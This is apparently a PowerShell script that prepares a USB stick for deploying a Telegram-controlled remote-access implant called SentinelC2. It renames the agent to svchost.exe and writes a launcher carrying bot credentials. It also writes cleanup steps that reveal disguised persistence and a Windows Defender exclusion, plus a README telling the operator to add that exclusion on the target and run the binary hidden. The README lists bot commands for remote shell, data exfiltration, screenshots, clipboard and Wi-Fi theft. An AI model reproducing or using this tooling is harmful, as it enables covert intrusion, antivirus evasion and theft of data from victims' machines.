# =============================================================================
# prepare_usb.ps1 - stage the SentinelC2 Telegram agent on a USB stick
# =============================================================================
# Run this ONCE on your operator machine with PowerShell.
# Plug in your USB stick first and check the drive letter in Explorer
# (E:, F:, G:, ...). Edit $usb below if needed.
# =============================================================================

$ErrorActionPreference = 'Stop'

# === EDIT THIS if your USB isn't G: ===
$usb = 'G:'
# =====================================

# Source binary (this file lives in the SentinelC2 repo build dir)
$src  = 'D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim\build\sentinel_tg_aggressive.exe'
$workdir = Join-Path $usb 'svctools'

# Bot creds (set these in the environment - never hardcode them)
if (-not $env:TELEGRAM_BOT_TOKEN) { Write-Error "Set `$env:TELEGRAM_BOT_TOKEN first"; exit 1 }
if (-not $env:TELEGRAM_CHAT_ID)   { Write-Error "Set `$env:TELEGRAM_CHAT_ID first";   exit 1 }
$token = $env:TELEGRAM_BOT_TOKEN
$chat  = $env:TELEGRAM_CHAT_ID

# Sanity checks
if (-not (Test-Path $src)) {
  Write-Error "Source binary not found: $src"
  exit 1
}
if (-not (Test-Path $usb)) {
  Write-Error "USB drive not found: $usb. Plug it in and check the drive letter in Explorer."
  exit 1
}

# 1. Make the working dir
if (-not (Test-Path $workdir)) {
  New-Item -ItemType Directory -Force -Path $workdir | Out-Null
}

# 2. Copy the agent, rename to svchost.exe (mimics a real Windows process)
$dest = Join-Path $workdir 'svchost.exe'
Copy-Item -Path $src -Destination $dest -Force
Write-Host "  copied: $dest" -ForegroundColor Green

# 3. Write run.bat - the launcher you'll execute on the target
$runBat = @"
@echo off
REM Launcher for SentinelC2 Telegram agent
set TELEGRAM_BOT_TOKEN=$token
set TELEGRAM_CHAT_ID=$chat
set C2_INSTALL_DIR=C:\ProgramData\Microsoft\Network\Connections\Cm
set C2_INSTALL_NAME=svchost.exe
start "" "%~dp0svchost.exe"
"@
Set-Content -Path (Join-Path $workdir 'run.bat') -Value $runBat -Encoding ASCII
Write-Host "  wrote: $workdir\run.bat" -ForegroundColor Green

# 4. Write cleanup.bat - manual teardown if the agent is unreachable
$cleanupBat = @"
@echo off
echo Removing persistence + binary...
schtasks /delete /tn "RealtekAudioUpdateTask" /f 2>nul
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Update" /f 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\Microsoft\Network\Connections\Cm" /f 2>nul
del /f /q "C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe" 2>nul
del /f /q "%LOCALAPPDATA%\.local\state.bin" 2>nul
echo Done.
"@
Set-Content -Path (Join-Path $workdir 'cleanup.bat') -Value $cleanupBat -Encoding ASCII
Write-Host "  wrote: $workdir\cleanup.bat" -ForegroundColor Green

# 5. Write a README so you remember what's on the USB
$readme = @"
SentinelC2 - Telegram-primary implant
=====================================
Bot:    @IamSentinal_bot
Chat:   $chat  (Sarthak / @sarthakdev143)
File:   svchost.exe  (rename target = C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe)

ON THE TARGET (admin PowerShell):
  1. Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network\Connections\Cm"
  2. Copy-Item E:\svctools\svchost.exe "C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe"
  3. Start-Process "C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe" -WindowStyle Hidden
  4. Eject the USB and run mavis-trash on E:\svctools to clean the USB

OR just double-click run.bat from the USB after plugging in.

ON YOUR TELEGRAM (chat with @IamSentinal_bot):
  /help /status /sysinfo /ps /av /wifi /clip /screenshot
  /cmd <shell> /exfil <kind> /upload <path> /download <id>
  /persist /cleanup /selfdestruct /watch start N /stop

TEARDOWN:
  In Telegram: /selfdestruct
  Or on the target: run cleanup.bat
"@
Set-Content -Path (Join-Path $workdir 'README.txt') -Value $readme -Encoding UTF8
Write-Host "  wrote: $workdir\README.txt" -ForegroundColor Green

Write-Host ""
Write-Host "USB prepared:" -ForegroundColor Cyan
Get-ChildItem $workdir | Format-Table Name, Length -AutoSize
Write-Host ""
Write-Host "Next: plug the USB into the target, follow the README." -ForegroundColor Yellow
